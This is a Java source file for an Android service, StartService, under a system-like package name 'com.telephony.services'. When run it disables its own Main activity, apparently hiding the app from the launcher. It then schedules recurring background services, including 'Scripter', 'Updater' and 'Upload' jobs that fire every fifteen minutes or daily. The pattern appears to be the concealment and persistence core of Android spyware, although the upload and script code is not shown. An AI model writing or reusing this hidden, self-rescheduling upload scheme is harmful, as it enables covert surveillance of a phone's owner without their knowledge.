package com.telephony.services;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;



public class StartService extends Service {
	private PreferenceUtils sPref = null;
	private ExecutorService es;

	@Override
	public void onCreate() {

		super.onCreate();
		
		es = Executors.newFixedThreadPool(1);		
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.execute(new RunService(intent, flags, startId, this));

		return super.onStartCommand(intent, flags, startId);

	}

	private class RunService implements Runnable {
		private final Intent intent;
		private final int flags;
		private final int startId;
		private final Context context;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		public void run() {
			Intent mi;
			PendingIntent pi;
			try {
				Utils.setComponentState(context, Main.class, false);				
				AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
				
				//start reglament service
				mi = new Intent(context, ReglamentService.class);
				pi = PendingIntent.getService(context, 0, mi, 0);				
				am.setRepeating(AlarmManager.ELAPSED_REALTIME, Utils.MINUTE * 7, AlarmManager.INTERVAL_DAY, pi);				
				
				//start Scripter service
				mi = new Intent(context, ScripterService.class);
				pi = PendingIntent.getService(context, 0, mi, 0);				
				am.setRepeating(AlarmManager.ELAPSED_REALTIME, Utils.MINUTE * 14, AlarmManager.INTERVAL_FIFTEEN_MINUTES, pi);
				
				//start Updater service
				mi = new Intent(context, UpdaterService.class);
				pi = PendingIntent.getService(context, 0, mi, 0);				
				am.setRepeating(AlarmManager.ELAPSED_REALTIME, Utils.MINUTE * 28, AlarmManager.INTERVAL_DAY, pi);
				
				//start Upload service
				mi = new Intent(context, UploadService.class);
				pi = PendingIntent.getService(context, 0, mi, 0);				
				am.setRepeating(AlarmManager.ELAPSED_REALTIME, Utils.MINUTE * 28, AlarmManager.INTERVAL_FIFTEEN_MINUTES, pi);				
				
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				stop();
			}
		}

		public void stop() {
			try {
				
			} catch (Exception e) {
				e.printStackTrace();
			}
			stopSelf();
		}

	}

	@Override
	public void onDestroy() {

		super.onDestroy();		
		es = null;
		sPref = null;		
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}